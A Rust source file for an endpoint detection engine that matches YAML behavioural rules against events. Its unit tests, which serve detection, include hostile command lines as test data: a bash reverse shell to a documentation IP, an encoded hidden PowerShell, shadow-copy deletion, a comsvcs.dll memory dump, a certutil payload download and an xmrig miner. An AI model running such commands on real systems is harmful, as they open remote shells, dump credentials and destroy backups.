//! Behavioral detection engine: YAML rules (Sigma-like) evaluated against the
//! flat field map of every ingested event, with optional sliding-window
//! thresholds for volumetric detections such as brute force.

use postern_proto::Event;
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, VecDeque};

pub const BUILTIN_RULES: &str = include_str!("../../../rules/builtin.yml");

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Rule {
    pub id: String,
    pub title: String,
    #[serde(default)]
    pub description: String,
    pub severity: String,
    #[serde(default)]
    pub mitre: Vec<String>,
    /// Event kind this rule applies to; omitted means every kind.
    #[serde(default)]
    pub kind: Option<String>,
    #[serde(rename = "match")]
    pub matcher: Matcher,
    #[serde(default)]
    pub threshold: Option<Threshold>,
    /// Response actions applied automatically when the endpoint is in
    /// `protect` mode: `kill_process`, `quarantine_file`, `isolate_host`.
    #[serde(default)]
    pub response: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Matcher {
    #[serde(default)]
    pub all: Vec<Cond>,
    #[serde(default)]
    pub any: Vec<Cond>,
    #[serde(default)]
    pub none: Vec<Cond>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Cond {
    pub field: String,
    pub op: String,
    #[serde(default)]
    pub value: Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Threshold {
    pub count: usize,
    pub window_secs: i64,
    #[serde(default)]
    pub group_by: Option<String>,
}

enum Test {
    Eq(String),
    Contains(String),
    StartsWith(String),
    EndsWith(String),
    In(Vec<String>),
    Regex(Regex),
    Gt(f64),
    Lt(f64),
    Exists,
}

struct CompiledCond {
    field: String,
    test: Test,
}

struct Compiled {
    rule: Rule,
    all: Vec<CompiledCond>,
    any: Vec<CompiledCond>,
    none: Vec<CompiledCond>,
}

fn as_text(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

fn compile_cond(c: &Cond) -> anyhow::Result<CompiledCond> {
    let test = match c.op.as_str() {
        "eq" => Test::Eq(as_text(&c.value)),
        "contains" => Test::Contains(as_text(&c.value).to_lowercase()),
        "startswith" => Test::StartsWith(as_text(&c.value)),
        "endswith" => Test::EndsWith(as_text(&c.value)),
        "in" => Test::In(
            c.value
                .as_array()
                .ok_or_else(|| anyhow::anyhow!("op `in` needs a list for field {}", c.field))?
                .iter()
                .map(as_text)
                .collect(),
        ),
        "regex" => Test::Regex(Regex::new(&as_text(&c.value))?),
        "gt" => Test::Gt(c.value.as_f64().ok_or_else(|| anyhow::anyhow!("op `gt` needs a number"))?),
        "lt" => Test::Lt(c.value.as_f64().ok_or_else(|| anyhow::anyhow!("op `lt` needs a number"))?),
        "exists" => Test::Exists,
        other => anyhow::bail!("unknown op `{other}`"),
    };
    Ok(CompiledCond { field: c.field.clone(), test })
}

impl CompiledCond {
    fn matches(&self, ev: &Event) -> bool {
        let Some(text) = ev.text(&self.field) else { return false };
        match &self.test {
            Test::Eq(v) => &text == v,
            Test::Contains(v) => text.to_lowercase().contains(v),
            Test::StartsWith(v) => text.starts_with(v.as_str()),
            Test::EndsWith(v) => text.ends_with(v.as_str()),
            Test::In(vs) => vs.iter().any(|v| v == &text),
            Test::Regex(re) => re.is_match(&text),
            Test::Gt(n) => text.parse::<f64>().map(|x| x > *n).unwrap_or(false),
            Test::Lt(n) => text.parse::<f64>().map(|x| x < *n).unwrap_or(false),
            Test::Exists => true,
        }
    }
}

/// Parse a YAML document holding either one rule or a list of rules.
pub fn parse_rules(yaml: &str) -> anyhow::Result<Vec<Rule>> {
    let doc: serde_yaml::Value = serde_yaml::from_str(yaml)?;
    let rules: Vec<Rule> = if doc.is_sequence() {
        serde_yaml::from_value(doc)?
    } else {
        vec![serde_yaml::from_value(doc)?]
    };
    for r in &rules {
        validate(r)?;
    }
    Ok(rules)
}

pub fn validate(rule: &Rule) -> anyhow::Result<()> {
    if rule.id.trim().is_empty() || rule.title.trim().is_empty() {
        anyhow::bail!("rule needs an id and a title");
    }
    if !["info", "low", "medium", "high", "critical"].contains(&rule.severity.as_str()) {
        anyhow::bail!("rule {}: severity must be info|low|medium|high|critical", rule.id);
    }
    let m = &rule.matcher;
    if m.all.is_empty() && m.any.is_empty() {
        anyhow::bail!("rule {}: needs at least one `all` or `any` condition", rule.id);
    }
    for c in m.all.iter().chain(&m.any).chain(&m.none) {
        compile_cond(c).map_err(|e| anyhow::anyhow!("rule {}: {e}", rule.id))?;
    }
    for r in &rule.response {
        if !["kill_process", "quarantine_file", "isolate_host"].contains(&r.as_str()) {
            anyhow::bail!("rule {}: unknown response `{r}`", rule.id);
        }
    }
    Ok(())
}

#[derive(Default)]
pub struct Engine {
    rules: Vec<Compiled>,
    windows: HashMap<String, VecDeque<i64>>,
    recent: HashMap<String, i64>,
}

/// Identical alerts (same rule, endpoint and subject) inside this window are
/// collapsed into one.
const DEDUP_MS: i64 = 60_000;

impl Engine {
    pub fn load(&mut self, rules: Vec<Rule>) {
        self.rules = rules
            .into_iter()
            .filter_map(|rule| {
                let c = |cs: &Vec<Cond>| cs.iter().map(compile_cond).collect::<anyhow::Result<Vec<_>>>();
                match (c(&rule.matcher.all), c(&rule.matcher.any), c(&rule.matcher.none)) {
                    (Ok(all), Ok(any), Ok(none)) => Some(Compiled { rule, all, any, none }),
                    _ => {
                        eprintln!("skipping invalid rule {}", rule.id);
                        None
                    }
                }
            })
            .collect();
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    pub fn evaluate(&mut self, endpoint_id: &str, ev: &Event) -> Vec<Rule> {
        let mut hits = Vec::new();
        for c in &self.rules {
            if let Some(kind) = &c.rule.kind {
                if kind != &ev.kind {
                    continue;
                }
            }
            if !c.all.iter().all(|x| x.matches(ev)) {
                continue;
            }
            if !c.any.is_empty() && !c.any.iter().any(|x| x.matches(ev)) {
                continue;
            }
            if c.none.iter().any(|x| x.matches(ev)) {
                continue;
            }
            if let Some(t) = &c.rule.threshold {
                let group = t.group_by.as_ref().and_then(|f| ev.text(f)).unwrap_or_default();
                let key = format!("{}|{}|{}", c.rule.id, endpoint_id, group);
                let w = self.windows.entry(key).or_default();
                w.push_back(ev.ts);
                while w.front().is_some_and(|ts| ev.ts - *ts > t.window_secs * 1000) {
                    w.pop_front();
                }
                if w.len() < t.count {
                    continue;
                }
                w.clear();
            }
            let subject = ["process.cmdline", "file.path", "net.remote_ip", "auth.source_ip", "net.local_port"]
                .iter()
                .find_map(|f| ev.text(f))
                .unwrap_or_default();
            let key = format!("{}|{}|{}", c.rule.id, endpoint_id, subject);
            if self.recent.get(&key).is_some_and(|last| ev.ts - *last < DEDUP_MS) {
                continue;
            }
            self.recent.insert(key, ev.ts);
            hits.push(c.rule.clone());
        }
        if self.recent.len() > 50_000 {
            let cutoff = ev.ts - DEDUP_MS;
            self.recent.retain(|_, ts| *ts >= cutoff);
        }
        hits
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> Engine {
        let mut e = Engine::default();
        e.load(parse_rules(BUILTIN_RULES).expect("builtin rules parse"));
        e
    }

    #[test]
    fn builtin_rules_are_valid_and_unique() {
        let rules = parse_rules(BUILTIN_RULES).unwrap();
        assert!(rules.len() >= 45);
        let mut ids: Vec<_> = rules.iter().map(|r| r.id.clone()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), rules.len(), "duplicate rule ids");
    }

    #[test]
    fn detects_reverse_shell() {
        let mut e = engine();
        let ev = Event::new("process_start")
            .with("process.name", "bash")
            .with("process.cmdline", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1");
        let hits = e.evaluate("ep1", &ev);
        assert!(hits.iter().any(|r| r.mitre.iter().any(|m| m.starts_with("T1059"))), "{hits:?}");
    }

    #[test]
    fn detects_windows_tradecraft() {
        let mut e = engine();
        let hit = |e: &mut Engine, name: &str, parent: &str, cmd: &str| -> Vec<String> {
            let ev = Event::new("process_start").with("process.name", name).with("process.parent_name", parent).with("process.cmdline", cmd);
            e.evaluate("win1", &ev).into_iter().map(|r| r.id).collect()
        };
        assert!(hit(&mut e, "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA").contains(&"PC-WIN-004".to_string()));
        assert!(hit(&mut e, "vssadmin.exe", "cmd.exe", "vssadmin.exe delete shadows /all /quiet").contains(&"PC-RANSOM-003".to_string()));
        assert!(hit(&mut e, "rundll32.exe", "cmd.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full").contains(&"PC-WIN-005".to_string()));
        assert!(hit(&mut e, "certutil.exe", "cmd.exe", "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe").contains(&"PC-WIN-003".to_string()));
        assert!(hit(&mut e, "notepad.exe", "explorer.exe", "notepad.exe C:\\Users\\a\\notes.txt").is_empty());
        assert!(hit(&mut e, "powershell.exe", "explorer.exe", "powershell.exe Get-ChildItem C:\\Users").is_empty());
    }

    #[test]
    fn benign_process_is_quiet() {
        let mut e = engine();
        let ev = Event::new("process_start")
            .with("process.name", "ls")
            .with("process.exe", "/usr/bin/ls")
            .with("process.cmdline", "ls -la /home");
        assert!(e.evaluate("ep1", &ev).is_empty());
    }

    #[test]
    fn brute_force_needs_threshold() {
        let mut e = engine();
        let mut fired = 0;
        for i in 0..12 {
            let mut ev = Event::new("auth")
                .with("auth.result", "failure")
                .with("auth.service", "sshd")
                .with("auth.source_ip", "198.51.100.7");
            ev.ts += i;
            fired += e.evaluate("ep1", &ev).len();
        }
        assert_eq!(fired, 1);
    }

    #[test]
    fn duplicate_alerts_are_collapsed() {
        let mut e = engine();
        let ev = Event::new("process_start")
            .with("process.name", "xmrig")
            .with("process.cmdline", "./xmrig -o pool:3333");
        let first = e.evaluate("ep1", &ev).len();
        let second = e.evaluate("ep1", &ev).len();
        assert!(first >= 1);
        assert_eq!(second, 0);
    }
}
